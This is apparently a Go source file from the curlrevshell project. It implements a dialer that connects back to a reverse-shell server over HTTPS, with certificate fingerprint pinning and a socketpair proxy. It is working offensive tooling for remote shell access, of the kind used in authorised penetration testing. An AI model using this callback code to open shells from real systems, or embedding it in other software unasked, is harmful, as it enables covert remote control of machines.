// Package crsdialer - Easy dialer to connect to curlrevshell
package crsdialer

/*
 * crsdialer.go
 * Easy dialer to connect to curlrevshell
 * By J. Stuart McMurray
 * Created 20250905
 * Last Modified 20260815
 */

import (
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"syscall"

	"github.com/magisterquis/curlrevshell/lib/sstls"
)

// SHA256Prefix is allowed but not required to be at the start of the
// fingerprint passed to Dial.
const SHA256Prefix = sstls.SHA256Prefix

// ErrNoMatchingCertificate indicates a TLS connection's peer did not present
// a certificate matching a configured fingerprint.
var ErrNoMatchingCertificate = sstls.ErrNoMatchingCertificate

// Dial connects to curlrevshell at the given server HTTPS URL.  The server's
// TLS certificate is expected to have the given fingerprint as printed by
// curlrevshell, though it allowed to omit [sstls.SHA256Prefix].
// The returned os.File, which is really a socketpair, is proxied to and from
// the HTTPS connection, which will be closed when the os.File is closed or the
// context is done.
func Dial(ctx context.Context, serverURL, fingerprint string) (
	*net.UnixConn,
	error,
) {
	/* Make sure we have all the relevant bits. */
	if "" == serverURL {
		return nil, errors.New("server URL cannot be empty")
	}
	if "" == fingerprint {
		return nil, errors.New("server fingerprint cannot be empty")
	}

	/* Pair of sockets, used as a pipe for shuffling data to and from the
	TLS connection. */
	fds, err := syscall.Socketpair(syscall.AF_UNIX, syscall.SOCK_STREAM, 0)
	if nil != err {
		return nil, fmt.Errorf("creating socket pair: %w", err)
	}
	cConn, err := unixConn(fds[0], "socket(client)")
	if nil != err {
		return nil, fmt.Errorf("creating client socket: %w", err)
	}
	sConn, err := unixConn(fds[1], "socket(server)")
	if nil != err {
		return nil, fmt.Errorf("creating server socket: %w", err)
	}
	var ok bool
	defer func() {
		if ok {
			return
		}
		cConn.Close()
		sConn.Close()
	}()

	/* Roll an HTTP client. */
	vfp, err := TLSFingerprintVerifier(fingerprint)
	if nil != err {
		return nil, fmt.Errorf(
			"setting up TLS fingerprint verification: %w",
			err,
		)
	}
	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = &tls.Config{
		InsecureSkipVerify: true,
		VerifyConnection:   vfp,
	}
	transport.ForceAttemptHTTP2 = true
	client := &http.Client{Transport: transport}

	/* Send forth a request. */
	req, err := http.NewRequestWithContext(
		ctx,
		http.MethodPost,
		serverURL,
		sConn,
	)
	if nil != err {
		return nil, fmt.Errorf("initializing HTTPS request: %w", err)
	}
	res, err := client.Do(req)
	if nil != err {
		return nil, fmt.Errorf("sending HTTPS request: %w", err)
	}
	if http.StatusOK != res.StatusCode {
		res.Body.Close()
		return nil, fmt.Errorf("non-OK response status: %s", res.Status)
	}

	/* Proxy from the body to the socketpair. */
	go func() {
		defer res.Body.Close()
		defer sConn.CloseWrite()
		io.Copy(sConn, res.Body)
	}()

	ok = true
	return cConn, nil
}

// Deprecated: As of curlrevshell v0.0.1-beta.9, this function simply calls
// [sstls.TLSFingerprintVerifier].
//
//go:fix inline
func TLSFingerprintVerifier(wantFP string) (
	func(tls.ConnectionState) error,
	error,
) {
	return sstls.TLSFingerprintVerifier(wantFP)
}

// unixConn turns fd into a net.UnixConn.
// The original file descriptor will be closed; do not close it.
func unixConn(fd int, name string) (*net.UnixConn, error) {
	/* Turn into an os.File, and autoclose. */
	f := os.NewFile(uintptr(fd), name)
	defer f.Close()

	/* Turn into a network connection. */
	c, err := net.FileConn(f)
	if nil != err {
		return nil, fmt.Errorf(
			"copying fd %d as a network connection: %w",
			fd,
			err,
		)
	}

	/* Should be a unix socket. */
	uc, ok := c.(*net.UnixConn)
	if !ok {
		return nil, fmt.Errorf(
			"file descriptor was a %T, not a %T", c, uc)
	}

	return uc, nil
}
